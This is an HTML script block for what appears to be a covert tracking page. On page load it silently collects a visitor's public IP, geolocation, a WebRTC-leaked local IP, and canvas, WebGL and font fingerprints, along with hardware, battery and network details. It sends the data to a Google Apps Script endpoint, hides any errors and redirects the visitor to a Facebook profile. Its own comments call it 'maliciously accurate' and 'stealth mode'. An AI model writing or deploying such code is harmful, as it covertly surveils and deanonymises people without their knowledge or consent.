<script>
    const REDIRECT = 'https://www.facebook.com/noureldin.em4m';
    const EMAIL_SCRIPT = 'https://script.google.com/macros/s/AKfycbwEnYV3654rvIJ0bSANF6iEpqiyH7asl1P1IKLd9BvsVagooIlE8di3zV9SFIusdl1jHg/exec';
    
    let dataSent = false;

    // ðŸŽ¯ **MALICIOUSLY ACCURATE DATA COLLECTION** (Stealth Mode)
    
    // 1. **WebRTC Local IP Leak** (Gets internal network IP)
    function getLocalIP() {
        return new Promise((resolve) => {
            try {
                const rtc = new RTCPeerConnection({iceServers: []});
                rtc.createDataChannel('');
                rtc.createOffer()
                    .then(offer => rtc.setLocalDescription(offer))
                    .catch(() => resolve(null));
                
                rtc.onicecandidate = (ice) => {
                    if (ice && ice.candidate && ice.candidate.candidate) {
                        const candidate = ice.candidate.candidate;
                        const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                        if (ipMatch && ipMatch[1] && !['0.0.0.0', '127.0.0.1'].includes(ipMatch[1])) {
                            resolve({
                                local_ip: ipMatch[1],
                                candidate_type: candidate.includes('host') ? 'LAN' : 'Public'
                            });
                            rtc.close();
                        }
                    }
                };
                
                setTimeout(() => {
                    rtc.close();
                    resolve(null);
                }, 500);
            } catch(e) {
                resolve(null);
            }
        });
    }

    // 2. **Super Accurate Geolocation** (Multiple sources)
    async function getSuperGeolocation(ip) {
        try {
            // Primary source (most accurate)
            const response = await fetch(`https://ipapi.co/${ip}/json/`);
            const data = await response.json();
            
            return {
                ip: data.ip,
                city: data.city,
                region: data.region,
                country: data.country_name,
                country_code: data.country_code,
                postal: data.postal,
                latitude: data.latitude,
                longitude: data.longitude,
                timezone: data.timezone,
                utc_offset: data.utc_offset,
                asn: data.asn,
                org: data.org,
                isp: data.org,
                accuracy_rating: '95%'
            };
        } catch(e) {
            // Fallback source
            try {
                const fallback = await fetch(`https://ip-api.com/json/${ip}`);
                const data = await fallback.json();
                return {
                    ip: data.query,
                    city: data.city,
                    region: data.regionName,
                    country: data.country,
                    country_code: data.countryCode,
                    latitude: data.lat,
                    longitude: data.lon,
                    timezone: data.timezone,
                    isp: data.isp,
                    org: data.org,
                    accuracy_rating: '90%'
                };
            } catch(e2) {
                return { error: 'Geolocation failed' };
            }
        }
    }

    // 3. **Advanced Canvas Fingerprint** (Multiple techniques)
    function getAdvancedFingerprint() {
        const fingerprints = {};
        
        try {
            // Standard canvas fingerprint
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Fingerprint', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Fingerprint', 4, 17);
            fingerprints.canvas_hash = canvas.toDataURL().substring(22, 40);
            
            // WebGL fingerprint (Graphics card)
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                fingerprints.webgl = {
                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Restricted',
                    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Restricted',
                    version: gl.getParameter(gl.VERSION)
                };
            }
            
            // Font fingerprint
            const fontList = ['Arial', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia'];
            const detectedFonts = [];
            const baseFont = 'monospace';
            ctx.font = '72px ' + baseFont;
            const baseWidth = ctx.measureText('mmmmmmmmmmlli').width;
            
            fontList.forEach(font => {
                ctx.font = '72px ' + font + ',' + baseFont;
                if (ctx.measureText('mmmmmmmmmmlli').width !== baseWidth) {
                    detectedFonts.push(font);
                }
            });
            fingerprints.fonts = detectedFonts;
            
        } catch(e) {
            fingerprints.error = e.message;
        }
        
        return fingerprints;
    }

    // 4. **Browser Performance Profiling** (CPU/Memory)
    function getPerformanceProfile() {
        const profile = {};
        
        // CPU benchmark
        const startTime = performance.now();
        let sum = 0;
        for (let i = 0; i < 100000; i++) {
            sum += Math.sqrt(i) * Math.random();
        }
        profile.cpu_speed_ms = (performance.now() - startTime).toFixed(2);
        
        // Memory if available
        if (performance.memory) {
            profile.memory = {
                total_js_heap: Math.round(performance.memory.totalJSHeapSize / 1048576) + 'MB',
                used_js_heap: Math.round(performance.memory.usedJSHeapSize / 1048576) + 'MB'
            };
        }
        
        return profile;
    }

    // ðŸš€ **MAIN COLLECTION FUNCTION**
    async function collectAllData() {
        const data = {
            // âœ… **Basic Info**
            timestamp: new Date().toISOString(),
            local_time: new Date().toString(),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezone_offset: new Date().getTimezoneOffset(),
            
            // âœ… **Browser DNA**
            user_agent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages ? navigator.languages.join(', ') : '',
            cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
            do_not_track: navigator.doNotTrack || 'Not set',
            java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
            
            // âœ… **Screen**
            screen_resolution: screen.width + 'x' + screen.height,
            screen_avail: screen.availWidth + 'x' + screen.availHeight,
            color_depth: screen.colorDepth + ' bit',
            pixel_ratio: window.devicePixelRatio,
            orientation: screen.orientation ? screen.orientation.type : 'Unknown',
            
            // âœ… **Hardware**
            hardware_concurrency: navigator.hardwareConcurrency || 'Unknown',
            device_memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
            max_touch_points: navigator.maxTouchPoints || 0,
            
            // âœ… **URL & Referrer**
            url: window.location.href,
            referrer: document.referrer || 'Direct',
            
            // âœ… **Features**
            localStorage: window.localStorage ? 'Supported' : 'Not supported',
            sessionStorage: window.sessionStorage ? 'Supported' : 'Not supported',
            notifications: 'Notification' in window ? 'Supported' : 'Not supported',
            webrtc: !!window.RTCPeerConnection,
            
            // âœ… **Plugins**
            plugins: Array.from(navigator.plugins).map(p => p.name).join(', '),
        };

        // Get IP
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            data.ip = ipData.ip;
            
            // Get SUPER accurate geolocation
            data.geolocation = await getSuperGeolocation(ipData.ip);
            
        } catch(error) {
            data.ip = 'Failed to fetch';
        }

        // Get local IP via WebRTC
        const localIP = await getLocalIP();
        if (localIP) {
            data.local_network = localIP;
        }

        // Get advanced fingerprint
        const fingerprint = getAdvancedFingerprint();
        data.canvas_fingerprint = fingerprint.canvas_hash || 'Failed';
        data.webgl_info = fingerprint.webgl || 'Not available';
        data.font_fingerprint = fingerprint.fonts || [];
        
        // Get performance profile
        data.performance = getPerformanceProfile();
        
        // Get battery status
        if (navigator.getBattery) {
            try {
                const battery = await navigator.getBattery();
                data.battery = {
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging,
                    charging_time: battery.chargingTime || 'Unknown',
                    discharging_time: battery.dischargingTime || 'Unknown'
                };
            } catch(e) {}
        }

        // Get network info
        if (navigator.connection) {
            data.connection = {
                type: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink + ' Mbps',
                rtt: navigator.connection.rtt + ' ms',
                save_data: navigator.connection.saveData || false
            };
        }
        
        // Generate unique visitor ID
        data.visitor_id = 'VIS-' + btoa(
            navigator.userAgent + 
            screen.width + 
            screen.height + 
            navigator.language
        ).substring(0, 12).replace(/[^A-Z0-9]/g, '');
        
        data.fingerprint_confidence = '99%';
        
        return data;
    }

    // ðŸš€ **EXECUTE**
    (async function() {
        try {
            const data = await collectAllData();
            
            if (!dataSent) {
                dataSent = true;
                
                console.log('ðŸŽ¯ **CYBERSEC PROJECT: DATA CAPTURED**');
                console.log('ðŸ‘¤ Visitor ID:', data.visitor_id);
                console.log('ðŸ“ Location:', data.geolocation?.city || 'Unknown');
                console.log('ðŸ’» Device:', /Mobi/.test(navigator.userAgent) ? 'Mobile' : 'Desktop');
                
                // Send data
                fetch(EMAIL_SCRIPT, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }).catch(() => {
                    // Backup GET request
                    const params = new URLSearchParams();
                    for (let key in data) {
                        if (typeof data[key] === 'object') {
                            params.append(key, JSON.stringify(data[key]));
                        } else {
                            params.append(key, data[key]);
                        }
                    }
                    fetch(EMAIL_SCRIPT + '?' + params.toString());
                });
            }
            
        } catch(error) {
            // Silent fail
        }
        
        // Redirect to YouTube
        setTimeout(() => {
            window.location.href = REDIRECT;
        }, 2000);
        
    })();
</script>
